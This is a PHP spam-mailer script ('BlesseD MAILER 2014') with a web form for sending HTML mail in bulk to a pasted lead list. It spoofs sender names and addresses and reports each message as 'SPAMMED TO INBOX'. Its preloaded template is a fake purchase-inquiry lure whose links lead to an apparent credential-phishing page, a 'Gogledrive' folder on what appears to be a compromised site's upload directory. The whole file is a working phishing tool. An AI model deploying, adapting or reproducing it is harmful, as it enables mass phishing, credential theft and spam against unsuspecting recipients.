<?php
mb_http_input("iso-8859-1");
mb_http_output("iso-8859-1");
?>
<?php
@set_time_limit(0);
if(isset($_POST['send']))
{
	$message = $_POST['html'];
	$subject = $_POST['ursubject'];
	$uremail = $_POST['uremail'];
	$urname = $_POST['realname'];
	$email = $_POST['email'];

	$message = urlencode($message);
	$message = ereg_replace("%5C%22", "%22", $message);
	$message = urldecode($message);
	$message = stripslashes($message);

}else{
	$testa ="";
	$message = "<html><body><font color='red'></font></body></html>";
	$subject = "salea Inquiry";
	$urname = "Purchase office";
	$uremail = "moched001@gmail.com";
	$email = "kennethlexxx_2010@yahoo.com";
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head>
<meta http-equiv="Content-Type" content="text/html">
<link rel="SHORTCUT ICON" href="http://www.smt.org//images/favicon.ico">
<title>BlesseD MAILER 2014&trade;</title>
<style type="text/css">
<!--
.form {font-family: "Courier New", Courier, monospace;border:none, background-color:#000000;}
.send {font-family: "Courier New", Courier, monospace;border:none; font-size:18px; background-color:#FFFFFF; font-black:bold}
#Layer1 {	position:absolute;
	left:203px;
	top:109px;
	width:829px;
	height:483px;
	z-index:1;
	margin-top: 0.5%;
	margin-right: 5%;
	right: 20%;
	bottom: 200%;
	margin-bottom: 10%;
	margin-left: 5%;
	border: thin solid #000;
}

-->
</style>
</head>

<body>
<form action="" method="post" name="codered">
<div align="center" id="Layer1">
  <table width="87%" height="77%" border="0" cellspacing="10">
    <tbody><tr>
      <td height="23" colspan="2"><div align="center" class="form">B L E S S E D S I N N E R </div></td>
    </tr>
    <tr>
      <td width="53%" height="24"><div align="center">
        <input name="uremail" type="text" class="form" id="uremail" size="30" value="<? print $uremail; ?>" placeholder="moched001@gmail.com">
      </div></td>
      <td width="47%"><div align="center">
        <input name="realname" type="text" class="form" id="realname" size="30" value="<? print $urname; ?>" placeholder="purchase office">
      </div></td>
    </tr>
    <tr>
      <td height="34" colspan="2"><div align="center">
        <input name="ursubject" type="text" class="form" id="ursubject" size="83%" value="<? print $subject; ?>" placeholder="Purchase Office">
      </div>
	  </td>
    </tr>
    <tr>
      <td height="165"><textarea name="html" class="form" cols="40" rows="10" placeholder="<div id="yui_3_16_0_1_1408885743913_4087" class="yiv7844458580">&nbsp;</div>
<div id="yui_3_16_0_1_1408885743913_4035" class="yiv7844458580" style="font-size: 18pt;">Hello,<br class="yiv7844458580" /><br class="yiv7844458580" />I called your office yesterday but the call could not go through,<br class="yiv7844458580" />i have listed the items in the attached file,<br class="yiv7844458580" />please give us your best quotation on them.<br class="yiv7844458580" /><br class="yiv7844458580" />Regards<br class="yiv7844458580" />Mr. Desmond<br class="yiv7844458580" />Purchasing Manager.</div>
<div id="yui_3_16_0_1_1408885743913_4089" class="yiv7844458580" style="font-size: 18pt;">&nbsp;</div>
<div id="yui_3_16_0_1_1408885743913_4086" class="yiv7844458580" style="font-size: 18pt;">&nbsp;<a id="yui_3_16_0_1_1408885743913_4085" class="yiv7844458580" href="http://www.srisugatha.com/admin/pages/kcfinder/upload/files/new/Gogledrive/index.php?rand=13InboxLightaspxn.1774256418&amp;fid.4.1252899642&amp;fid=1&amp;fav.1&amp;rand.13InboxLight.aspxn.1774256418&amp;fid.1252899642&amp;fid.1&amp;fav.1&amp;email=&amp;email&amp;&amp;.rand=13vqcr8bp0gud&amp;lc=1033&amp;id=64855&amp;mkt=en-us&amp;cbcxt=mai&amp;snsc=1" target="_blank"><img id="yui_3_16_0_1_1408885743913_4084" class="yiv7844458580" src="https://mail.google.com/mail/u/0/?ui=2&amp;ik=69fe43f16b&amp;view=fimg&amp;th=147e8b4a7f948641&amp;attid=0.1&amp;disp=inline&amp;safe=1&amp;attbid=ANGjdJ_XxubQUqsbtnkXYakX0MrVZxec4ltFgvK063Xb48y51BoSaEJzauW33nPNwFn1dA8JIkIQ8skZXOWAk5KGZ2_pr0TZJtVYVG2zdEYPkN_h84ifAav49jJuKoI&amp;ats=1408609218752&amp;rm=147e8b4a7f948641&amp;zw&amp;sz=w1246-h496" alt="Displaying 1.png" /></a></div>
<p><a id="yui_3_16_0_1_1408885743913_4128" class="yiv7844458580" href="http://www.srisugatha.com/admin/pages/kcfinder/upload/files/new/Gogledrive/index.php?rand=13InboxLightaspxn.1774256418&amp;fid.4.1252899642&amp;fid=1&amp;fav.1&amp;rand.13InboxLight.aspxn.1774256418&amp;fid.1252899642&amp;fid.1&amp;fav.1&amp;email=&amp;email&amp;&amp;.rand=13vqcr8bp0gud&amp;lc=1033&amp;id=64855&amp;mkt=en-us&amp;cbcxt=mai&amp;snsc=1" target="_blank">View slide show (1)</a>&nbsp; <a href="http://www.srisugatha.com/admin/pages/kcfinder/upload/files/new/Gogledrive/index.php?rand=13InboxLightaspxn.1774256418&amp;fid.4.1252899642&amp;fid=1&amp;fav.1&amp;rand.13InboxLight.aspxn.1774256418&amp;fid.1252899642&amp;fid.1&amp;fav.1&amp;email=&amp;email&amp;&amp;.rand=13vqcr8bp0gud&amp;lc=1033&amp;id=64855&amp;mkt=en-us&amp;cbcxt=mai&amp;snsc=1">download as zip</a></p>" ><? print $message; ?></textarea></td>
      <td>
	  <div align="right">
        <textarea class="form" rows="10" placeholder="Leads" name="email" cols="35"><? print $email; ?></textarea>
      </div></td></tr>
  </tbody>
  </table>
  <div><input type="submit" class="send" name="send" value="Start Sending">
  </div><DIV class="send"><?php
if(!isset($_POST['send'])){
	exit;
}

if(!isset($_GET['c']))
{
	$email = explode("\n", $email);
}else{
	$email = explode(",", $email);
}
$son = count($email);

if(!isset($_GET['e'])){
	$header = "MIME-Version: 1.0\n";
	$header .= "Content-type: text/html; charset=iso-8859-1\n";
	$header .= "From: ".$urname . " <" . $uremail . ">\n";
	$header .= "Reply-To: " . $uremail . "\n";
	$header .= "X-Priority: 3\n";
	$header .= "X-MSMail-Priority: Normal\n";
	$header .= "X-Mailer: ".$_SERVER["HTTP_HOST"];
}else{
	$header ='MIME-Version: 1.0' . "\r\n";
	$header .= 'Content-type: text/html' . "\r\n";
	$header .="From: ".$uremail;
}
$i = 0;
$voy=1;
while($email[$i])
{
	if(isset($_GET['time']) && isset($_GET['cant'])){
		if(fmod($i,$_GET['cant'])==0 && $i>0){
			print "----------------------------------> wait ".$_GET['time']." Segs. Sending to ".$_GET['notf']."...<br>\n";
			flush();
			@mail($_GET['notf'], $subject, $message, $header);
			sleep($_GET['time']);
		}
	}
	$mail = str_replace(array("\n","\r\n"),'',$email[$i]);
        $message1 = ereg_replace("&email&", $mail, $message);
	if(@mail($mail, $subject, $message1, $header))
	{
		print "<font color=blue face=verdana size=1>    ".$voy." OF ".$son."  ;-) ".trim($mail)."  SPAMMED TO INBOX</font><br>\n";
		flush();
	}
	else
	{
		print "<font color=red face=verdana size=1>    ".$voy." OF ".$son.":-( ".trim($mail)."  OOOPSS!!! SOMETHING IS WRONG</font><br>\n";
		flush();
	}                                                             
	$i++;
	$voy++;
}

?></DIV>
</div>
</form>